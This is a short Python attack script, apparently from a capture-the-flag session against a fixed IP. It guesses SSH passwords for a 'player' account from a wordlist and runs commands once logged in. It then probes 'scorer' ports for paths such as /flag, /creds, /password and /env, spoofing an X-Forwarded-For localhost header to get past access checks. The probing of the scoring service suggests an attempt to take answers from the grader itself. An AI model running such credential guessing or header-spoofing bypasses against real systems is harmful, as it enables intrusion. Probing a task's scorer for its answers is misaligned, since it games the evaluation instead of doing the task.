import paramiko, requests
HOST="13.37.197.230"; PORT=28491; USER="player"

# 1) pre-auth banner (some CTF ssh print hints)
t=paramiko.Transport((HOST,PORT));
try:
    t.start_client(timeout=15)
    try: t.auth_password(USER,"__wrong__")
    except Exception: pass
    print("BANNER:", repr(t.get_banner()))
except Exception as e:
    print("banner err",e)
finally:
    t.close()

# 2) targeted creds (not brute force)
pw=["player2026","citadel2026","boot2root","Boot2Root","hawkeye","HawkEye",
    "290a8731c89d6d26","nctf2026","NCTF2026","Password123","citadel!","player!",
    "letmein","welcome","ubuntu","player@2026"]
for p in pw:
    c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(HOST,port=PORT,username=USER,password=p,timeout=12,look_for_keys=False,
                  allow_agent=False,banner_timeout=15,auth_timeout=12)
        print(f"[+] FOUND player:{p!r}")
        _,o,_=c.exec_command("id;hostname;ls -la ~"); print(o.read().decode(errors='replace')); c.close(); break
    except paramiko.AuthenticationException:
        print(f"[-] {p!r}")
    except Exception as e:
        print(f"[!] {p!r} {type(e).__name__}:{str(e)[:60]}")
    finally:
        try:c.close()
        except:pass

# 3) more scorer paths
print("\n-- scorer extra paths --")
for port in [28494,28495]:
    for path in ["/debug","/instance","/seed","/password","/player","/creds","/reset","/help","/env","/flag"]:
        for xff in [None,"127.0.0.1"]:
            h={"X-Forwarded-For":xff} if xff else {}
            try:
                r=requests.get(f"http://{HOST}:{port}{path}",headers=h,timeout=5)
                if r.status_code!=404: print(f":{port} [{r.status_code}]{'xff' if xff else ''} {path} -> {r.text[:150]}")
            except Exception: pass
